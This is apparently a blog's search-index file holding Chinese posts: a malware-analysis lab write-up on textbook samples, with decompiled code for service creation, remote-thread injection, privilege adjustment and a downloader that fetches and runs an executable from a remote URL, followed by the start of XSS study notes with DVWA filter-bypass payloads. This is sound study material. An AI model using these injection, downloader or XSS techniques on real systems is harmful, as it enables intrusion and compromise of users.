<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2019/03/31/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81lab01/"/>
      <url>/2019/03/31/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81lab01/</url>
      
        <content type="html"><![CDATA[<h3 id="Lab-01-2"><a href="#Lab-01-2" class="headerlink" title="Lab_01_2"></a>Lab_01_2</h3><h4 id="在线反病毒扫描"><a href="#在线反病毒扫描" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="http://www.virustotal.com的扫描结果中，大部分引擎将该文件识别为恶意程序。" target="_blank" rel="noopener">www.virustotal.com的扫描结果中，大部分引擎将该文件识别为恶意程序。</a></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0b03b4a72e99b40a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会创建一个名为Malservice的服务和名为HGL345的互斥体。</p><h4 id="PEiD"><a href="#PEiD" class="headerlink" title="PEiD"></a>PEiD</h4><p>由PEiD分析可知加了UPX壳。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-1137ae4573b0448c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>upx源代码已由upx.sourceforge.net搬至<a href="https://github.com/upx/upx/releases" target="_blank" rel="noopener">github</a>，下载工具，脱壳得到lab-01-02-new.exe，后续分析均基于此文件进行。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a5c0b80c9b1cd73a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>再次拖入PEiD，发现脱壳成功。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f59cbde0cf3c371a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>、<code>WININET.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-d5f273dd9fb72920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>查看字符串，发现存在网址<code>http:///www.malwareanalysisbook.com</code>和<code>Internet Exploer 8.0</code>字样，初步猜测程序会使用IE浏览器打开该网址。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-4b9ad8d655978352.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-2d116d70c00100e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>OpenMutexA</li><li>CreateMutexA</li><li>CreateThread</li></ul></li><li>ADVAPI32.dll<ul><li>CreateServiceA</li><li>StartServiceCtrlDispatcherA</li><li>OpenSCManagerA</li></ul></li><li>WININET.dll<ul><li>InternetOpenA</li><li>InternetOpenUrlA</li></ul></li></ul><p>可以看出该程序将会创建进程、服务和线程，并打开某个网址，进一步证实了之前的猜测。</p><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>用ida打开文件，F5反汇编，截取部分代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//main()</span><br><span class="line">  ServiceStartTable.lpServiceName = aMalservice;</span><br><span class="line">  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  StartServiceCtrlDispatcherA(&amp;ServiceStartTable);</span><br><span class="line">  return sub_401040();</span><br></pre></td></tr></table></figure><p>其中<code>aMalservice</code>的取值如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-5dec2ba9a662ee0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//sub_401040()</span><br><span class="line">  if ( OpenMutexA(0x1F0001u, 0, Name) )//若已存在则不再创建</span><br><span class="line">    ExitProcess(0);</span><br><span class="line">  CreateMutexA(0, 0, Name);//若不存在，则创建一个互斥体，保证只执行一次</span><br><span class="line">  v0 = OpenSCManagerA(0, 0, 3u);</span><br><span class="line">  GetModuleFileNameA(0, &amp;Filename, 0x3E8u);</span><br><span class="line">  CreateServiceA(v0, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, &amp;Filename, 0, 0, 0, 0, 0);//创建服务</span><br><span class="line"> （省略部分代码）</span><br><span class="line">  SystemTime.wYear = 2100;//设定时间，到该时间后执行代码</span><br><span class="line">  SystemTimeToFileTime(&amp;SystemTime, &amp;FileTime);</span><br><span class="line">  v1 = CreateWaitableTimerA(0, 0, 0);//创建计时器</span><br><span class="line">  SetWaitableTimer(v1, (const LARGE_INTEGER *)&amp;FileTime, 0, 0, 0, 0);//激活计时器</span><br><span class="line">  if ( WaitForSingleObject(v1, 0xFFFFFFFF) )//等待触发</span><br><span class="line">  &#123;</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else//如果系统时间到了2100年</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = 20;</span><br><span class="line">    do//建立20个线程</span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v2 );</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中<code>Displayname</code>和<code>Name</code>的取值如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f8d1af90e054811f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//StartAddress()</span><br><span class="line">  for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>其中<code>InternetOpenA()</code>和<code>InternetOpenUrlA()</code>的参数分别如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e028ad275d42ebdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该恶意程序的目的是创建一个名为Malservice的服务，并在2100年时创建20个线程，使用IE浏览器打开指定网址，推测编写者想要集中在同一时间对该网站进行DDoS攻击。</p><h3 id="Lab-01-3"><a href="#Lab-01-3" class="headerlink" title="Lab_01_3"></a>Lab_01_3</h3><h4 id="在线反病毒扫描-1"><a href="#在线反病毒扫描-1" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="http://www.virustotal.com的扫描结果中，绝大部分引擎将该文件识别为恶意程序。" target="_blank" rel="noopener">www.virustotal.com的扫描结果中，绝大部分引擎将该文件识别为恶意程序。</a></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-f4f9118a56c937f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会向特定网址发出请求，并和两个未知IP间产生网络流量。它还会打开、写入、删除一些文件；打开并设置部分注册表项；创建一些进程；输入shell命令等，不再逐一截图。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-806fdbb648897cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-38317599ade7672e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="PEiD-1"><a href="#PEiD-1" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，易知加了FSG v1.0的壳。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-933a2785316f6795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>搜索了脱壳教程，步骤如下：</p><ol><li>拖入ollydbg，选择<code>插件-&gt;OllyDump-&gt;跨段查找脱壳程序的OEP（遇到call就跳过）</code>，<code>Ctrl+A</code>分析代码，得到地址如下：</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/10480445-61265ce3274660ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><ol start="2"><li>选择<code>插件-&gt;OllyDump-&gt;脱壳在当前调试的进程</code>，点击<code>获取EIP作为OEP</code>，选择脱壳，另存为lab01-03-new.exe。</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/10480445-29172d6109c94af3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>拖入PEiD，可以看到脱壳成功，后续分析均基于lab01-03-new.exe进行。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-d3d01043e5df6dc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>oleaut32.dll</code>、<code>ole32.dll</code>、<code>msvcrt.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-0eeaa5b0b0120e91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker-1"><a href="#Dependency-Walker-1" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-4676013c66fa0ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><ul><li>ole32.dll<ul><li>OleInitialize</li><li>CoCreateInstance</li><li>OleUninitialize</li></ul></li></ul><h4 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-03-new.exe，F5反汇编，截取部分代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if ( OleInitialize(0) &gt;= 0 )</span><br><span class="line">&#123;</span><br><span class="line">  CoCreateInstance(&amp;rclsid, 0, 4u, &amp;riid, &amp;ppv);</span><br><span class="line">  if ( ppv )</span><br><span class="line">  &#123;</span><br><span class="line">    VariantInit(&amp;pvarg);</span><br><span class="line">    v7 = 3;</span><br><span class="line">    v8 = 1;</span><br><span class="line">    v3 = SysAllocString(L&quot;http://www.malwareanalysisbook.com/ad.html&quot;);</span><br><span class="line">    (*(void (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))(</span><br><span class="line">      ppv,</span><br><span class="line">      v3,</span><br><span class="line">      &amp;v7,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg);</span><br><span class="line">    SysFreeString(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  OleUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该程序的主要目的是打开特定网址，该网址可能含有恶意代码。</p><h3 id="Lab-01-4"><a href="#Lab-01-4" class="headerlink" title="Lab_01_4"></a>Lab_01_4</h3><h4 id="在线反病毒扫描-2"><a href="#在线反病毒扫描-2" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="http://www.virustotal.com的扫描结果中，大部分引擎将该文件识别为恶意程序。" target="_blank" rel="noopener">www.virustotal.com的扫描结果中，大部分引擎将该文件识别为恶意程序。</a></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-71bca6e7692fd9d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>此外，在Behavior选项卡下可以看到，该程序将会请求特定网址，与未知IP建立TCP连接；移动wupdmgr.exe并写入；运行wupdmgr.exe以创建进程；开启服务等，不再逐一截图。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e33a1c3920684a6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b9987d267594c5e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-e3ca5bc8f69d7810.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="PEiD-2"><a href="#PEiD-2" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，看到加了UPX壳。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c946db7da751699e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>惯例脱壳，后续分析均基于脱壳后的lab01-04-new.exe进行。<br>将脱壳后的exe拖入PEiD，发现可以看到详细信息，证明脱壳成功。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-32b97b19faa3f059.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-dd77ae279adef2a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>转换时间戳得知该程序的编译时间是2019年8月30日，明显经过了篡改。<br>此外，该程序还包含了一个资源，具体分析详见Resource Hacker部分。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-93cc9081e5ec1c50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-b4e3c261e43a1fab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>查看字符串，可以发现<code>\winup.exe</code>、<code>\system32\wupdmgrd.exe</code>和<code>http:///www.practicalmalwareanalysis.com/updater.exe</code>等字样，其中wupdmgr.exe是电脑系统自动升级的程序文件，初步推测程序将会从指定网址下载更新器，并存为winup.exe或替换wupdmgrd.exe，实际情况仍有待进一步分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-91442febf445a3ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Resource-Hacker"><a href="#Resource-Hacker" class="headerlink" title="Resource Hacker"></a>Resource Hacker</h4><p>用Resource Hacker打开该程序，通过<code>MZ</code>文件头和<code>PE</code>字样可以发现包含的是一个exe文件。选择<code>Action -&gt; save *.bin resource</code>将其导出为lab01-04-bin.exe，留待后续分析。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-637106054d6f172d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h4 id="Dependency-Walker-2"><a href="#Dependency-Walker-2" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>首先打开lab01-04-new.exe，界面如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-a2002343d7abea0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>获取路径及文件相关<ul><li>GetTempPathA</li><li>GetWindowsDirectory</li><li>CreateFileA</li><li>WriteFile</li><li>MoveFileA</li></ul></li><li>二进制资源加载<ul><li>FindResourceA</li><li>LoadResource</li><li>SizeofResource</li></ul></li><li>获取句柄，大多用来操作远程进程<ul><li>GetCurrentProcess</li><li>OpenProcess</li><li>GetProcAddress</li></ul></li><li>运行文件，建立远程线程<ul><li>WinExec</li><li>CreateRemoteThread</li></ul></li></ul></li><li>ADVAPI32.dll<ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul></li></ul><p>可以看出lab01-04-new.exe将会对自身创建的进程进行提权操作，并创建及移动某些文件。除此以外，该程序还将运行某个exe文件并创建远程线程，目的或为将代码注入指定exe执行。</p><p>再打开之前导出的lab01-04-bin.exe，界面如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-c39496eeb792a309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>需要注意的函数如下：</p><ul><li>KERNEL32.dll<ul><li>GetTempPathA</li><li>GetWindowsDirectory</li><li>WinExec</li></ul></li><li>URLMON.dll<ul><li>URLDownloadToFileA</li></ul></li></ul><p>不难看出，lab01-04-bin.exe将从指定URL地址读取内容，并将读取到的内容保存到特定路径下的文件里，同时也会执行某个或某些exe文件，所执行的文件大几率为从网页上下载的程序。</p><h4 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-04-new.exe，F5反汇编，截取部分代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//main()</span><br><span class="line">  dword_403124 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(v5, aEnumprocesses);</span><br><span class="line">  //检索进程中的每一个进程标识符</span><br><span class="line">  if ( dword_403124 &amp;&amp; dword_403128 &amp;&amp; dword_40312C )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( dword_403124(dwProcessId, 4096, &amp;v14) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v14 &gt;&gt; 2;</span><br><span class="line">      for ( i = 0; i &lt; v7 + 1; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( dwProcessId[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = sub_401000(dwProcessId[i]);</span><br><span class="line">          if ( v19 )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = dwProcessId[i];</span><br><span class="line">            break;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = sub_401174(v11);//创建远程线程</span><br><span class="line">        if ( v12 )//若成功</span><br><span class="line">        &#123;</span><br><span class="line">          GetWindowsDirectoryA(&amp;Buffer, 0x10Eu);//获取目录</span><br><span class="line">          snprintf(&amp;Dest, 0x10Eu, aSS_0, &amp;Buffer, aSystem32Wupd_0);</span><br><span class="line">          //将Dest赋值为wupdmgrd.exe的路径</span><br><span class="line">          GetTempPathA(0x10Eu, &amp;v20);//获取临时路径</span><br><span class="line">          snprintf(&amp;NewFileName, 0x10Eu, aSS_1, &amp;v20, aWinup_exe);</span><br><span class="line">          //将NewFileName赋值为winup.exe的路径</span><br><span class="line">          MoveFileA(&amp;Dest, &amp;NewFileName);//将wupdmgrd.exe移动为临时路径下的winup.exe</span><br><span class="line">          sub_4011FC();//创建、写入并运行新的wupdmgrd.exe</span><br><span class="line">          result = 0;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>其中，与<code>v12 = sub_401174(v11);</code>有关的代码截取部分如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//sub_401174()</span><br><span class="line">  if ( sub_4010FC(aSedebugprivile) )//若未提权</span><br><span class="line">  &#123;</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else//获取进程句柄需要在提权后才能进行</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = LoadLibraryA(LibFileName);</span><br><span class="line">    lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(v2, (LPCSTR)2);</span><br><span class="line">    hProcess = OpenProcess(0x1F0FFFu, 0, dwProcessId);//获取进程句柄</span><br><span class="line">    if ( hProcess )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateRemoteThread(hProcess, 0, 0, lpStartAddress, 0, 0, 0);//建立远程线程</span><br><span class="line">      result = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//sub_4010FC()</span><br><span class="line">  if ( LookupPrivilegeValueA(0, lpName, (PLUID)NewState.Privileges) )</span><br><span class="line">  &#123;</span><br><span class="line">    AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0, 0, 0);//提权</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>对<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">//sub_4011FC()</span><br><span class="line">  GetWindowsDirectoryA(&amp;Buffer, 0x10Eu);</span><br><span class="line">  snprintf(&amp;Dest, 0x10Eu, Format, &amp;Buffer, aSystem32Wupdmg);</span><br><span class="line">  //将Dest赋值为将要创建的wupdmgrd.exe的路径</span><br><span class="line">  hModule = GetModuleHandleA(0);</span><br><span class="line">  hResInfo = FindResourceA(hModule, Name, Type);</span><br><span class="line">  lpBuffer = LoadResource(hModule, hResInfo);//加载资源</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);</span><br><span class="line">  hFile = CreateFileA(&amp;Dest, 0x40000000u, 1u, 0, 2u, 0, 0);</span><br><span class="line">  //创建wupdmgrd.exe</span><br><span class="line">  WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">  //写入wupdmgrd.exe</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  return WinExec(&amp;Dest, 0);//运行</span><br></pre></td></tr></table></figure></p><p>打开lab01-04-bin.exe，F5反汇编，截取部分代码如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//main()</span><br><span class="line">  GetTempPathA(0x10Eu, &amp;Buffer);</span><br><span class="line">  snprintf(&amp;Dest, 0x10Eu, Format, &amp;Buffer, aWinup_exe);</span><br><span class="line">  //将Dest赋值为临时文件夹下winup.exe的绝对路径</span><br><span class="line">  WinExec(&amp;Dest, 5u);</span><br><span class="line">  //运行winup.exe</span><br><span class="line">  GetWindowsDirectoryA(&amp;v7, 0x10Eu);</span><br><span class="line">  snprintf(&amp;CmdLine, 0x10Eu, aSS_0, &amp;v7, aSystem32Wupdmg);</span><br><span class="line">  //将CmdLine赋值为wupdmgrd.exe的绝对路径</span><br><span class="line">  if ( !URLDownloadToFileA(0, aHttpWww_practi, &amp;CmdLine, 0, 0) )</span><br><span class="line">    //若已存在则运行，若不存在则下载</span><br><span class="line">    //URLDownloadToFile下载文件前先在本地的缓存中查找此文件，如果存在则不会再次下载</span><br><span class="line">    WinExec(&amp;CmdLine, 0);</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure></p><h4 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h4><p>该程序中包含了另一个exe文件（下称04-bin），其中，lab01-04为主体，负责提权、移动文件并向04-bin传递参数，04-bin主要起到下载器和运行的作用。<br>lab01-04首先提权以获取进程句柄并创建远程线程，此后将system32目录下的wupdmgrd.exe移动到临时文件夹下，再把自己的资源（04-bin）写入为新的wupdmgrd.exe并执行。04-bin查找本地是否存在特定文件A。若不存在，则从指定网址下载update.exe并存为该特定文件A；若存在，则执行该文件。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="/2019/03/15/XSS%E7%AE%80%E8%BF%B0&amp;%E5%85%A5%E9%97%A8/"/>
      <url>/2019/03/15/XSS%E7%AE%80%E8%BF%B0&amp;%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>本学期课程的阶段性总结<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>上课上自闭了，我真的不是web手也打不来web题……<br>写个总结，算是补上一年前跟大佬py到的那两道web的wp。<br>……我怎么总在搞给过去的自己打补丁这种沙雕行为（。<br>建议结合<a href="https://www.jianshu.com/p/5d123a4f55f9" target="_blank" rel="noopener">2019-03-17 XSS实验报告</a>观看。</the></p><h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也称为非持久型XSS（Non-persistent XSS），特点为单击时触发，执行一次。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>通常出现在网站的搜索栏、用户登入口等地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10480445-83b7eb78bb3cb456.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h5 id="过滤字符的应对"><a href="#过滤字符的应对" class="headerlink" title="过滤字符的应对"></a>过滤字符的应对</h5><p>此处以DVWA为例。<br><strong>在Medium级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-cc5d9878af990168.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>可以看到只过滤了<code>&lt;script&gt;</code>字符串，常用方法有更改大小写或双写以拼接<code>&lt;script&gt;</code>等，其他绕过方法详见文章“常见XSS变形”一节。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(<span class="number">222</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>在High级别中，关键代码如下所示：</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/10480445-7de3b3200d4ed035.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 